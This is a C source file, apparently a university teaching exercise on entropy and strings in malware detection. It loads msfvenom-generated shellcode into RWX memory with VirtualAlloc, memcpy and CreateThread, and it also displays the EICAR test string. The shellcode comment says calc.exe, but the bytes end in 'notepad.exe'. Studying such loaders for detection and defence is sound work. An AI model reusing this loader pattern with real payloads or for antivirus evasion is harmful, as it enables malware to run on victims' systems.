//EDU for Entropy and strings

#include <Windows.h>
#include <stdio.h>

//------------------------------------------------------------------------------------------//
// DO NOT TOUCH THIS STUFF BELOW HERE
typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
const char* test_string = "UniOffenburg2025";
void test_func() {
	OutputDebugStringA(test_string);
}
// DO NOT TOUCH THIS STUFF ABOVE HERE
//------------------------------------------------------------------------------------------//









// ROT13
void rot13(char* str) {
	// Iterate through each character of the string until the null terminator is reached.
	for (int i = 0; str[i] != '\0'; i++) {
		char c = str[i]; // Get the current character.

		// Check if the character is an uppercase letter (A-Z).
		if (c >= 'A' && c <= 'Z') {
			// Apply ROT13: (character - 'A' + 13) % 26 + 'A'
			str[i] = ((c - 'A' + 13) % 26) + 'A';
		}
		// Check if the character is a lowercase letter (a-z).
		else if (c >= 'a' && c <= 'z') {
			// Apply ROT13: (character - 'a' + 13) % 26 + 'a'
			// This formula shifts the character by 13 positions within the alphabet
			// and wraps around if it goes past 'z'.
			str[i] = ((c - 'a' + 13) % 26) + 'a';
		}
	}
}


int main() {
	//------------------------------------------------------------------------------------------//
	// DO NOT TOUCH THIS STUFF BELOW HERE
	test_func();
	// DO NOT TOUCH THIS STUFF ABOVE HERE
	//------------------------------------------------------------------------------------------//


	// Debugging message
	// char debugMessage[] = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
	// rot13(debugMessage);
	// printf("Debug Message: %s\n", debugMessage);

	// Show the user a message
	char eicar[] = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
	//rot13(eicar);
	MessageBoxA(NULL, eicar, "Fancy looking string : )", MB_OK | MB_ICONINFORMATION);

	// Shellcode to launch calc.exe; not encoded or anything fancy
	//msfvenom -p windows/x64/exec CMD=calc.exe -f c
	unsigned char buf[] = 
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

	// Allocate memory for shellcode using VirtualAlloc
	HANDLE hVirtualAlloc;
	SIZE_T dwSize = sizeof(buf);
	// press enter to continue
	printf("Press Enter to allocate and execute shellcode...\n");
	getchar();
	hVirtualAlloc = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hVirtualAlloc == NULL) {
		printf("[-] VirtualAlloc failed. Error: %lu\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] VirtualAlloc succeeded. Address: %p\n", hVirtualAlloc);
	}

	// Copy shellcode to allocated memory
	printf("Press Enter to copy shellcode into new area...\n");
	getchar();
	if (memcpy(hVirtualAlloc, buf, dwSize) == NULL) {
		printf("[-] memcpy failed. Error: %lu\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] memcpy succeeded.\n");
	}

	// Create a thread to execute the shellcode
	printf("Press Enter to create a new thread...\n");
	getchar();
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hVirtualAlloc, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("[-] CreateThread failed. Error: %lu\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] CreateThread succeeded. Thread Handle: %p\n", hThread);
	}


	WaitForSingleObject(hThread, INFINITE);

	return 0;

}